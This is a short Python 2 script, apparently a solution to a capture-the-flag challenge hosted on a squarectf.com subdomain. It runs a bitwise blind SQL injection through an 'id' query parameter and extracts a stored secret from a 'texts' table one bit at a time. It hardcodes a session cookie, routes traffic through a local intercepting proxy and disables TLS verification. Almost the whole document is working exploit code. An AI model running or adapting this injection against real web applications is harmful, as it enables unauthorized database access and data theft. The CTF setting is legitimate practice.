"""
Lame python2 script to exploit the SQLi and dump the data from the texts table where id = 3
"""
import urllib, urllib2,urllib3
import sys
import requests

urllib3.disable_warnings()

bits = (
    '0x01',
    '0x02',
    '0x04',
    '0x08',
    '0x10',
    '0x20',
    '0x40',
    '0x80'
)

secret = ''
counter = 0
for i in range(1,87):
    bitstream = ''
    counter += 1
    for b in bits:
        query = 'id=493 or (select count(id) where id=3 and ord(substr(data,%d,1))&%s=%s)=1' % (i, b, b)
        # print query
        resp = requests.get("https://lockbox-6ebc413cec10999c.squarectf.com/", 
                  params={'id': query}, 
                  headers={'Cookie': '__cfduid=db5f86550c39cd4f398cdc524577716421570990817'},
                  proxies={"http":"http://127.0.0.1:8080/",'https':'http://127.0.0.1:8080'},
                  verify=False)
        if 'bad hash' in resp.text:
            bitstream += '0'
        else:
            # print resp.text
            bitstream += '1'
    # print bitstream[::-1]
    secret += chr(int(bitstream[::-1],2))
    if counter % 5 == 0:
        print 'Done %d rounds' % counter
        print secret
print secret
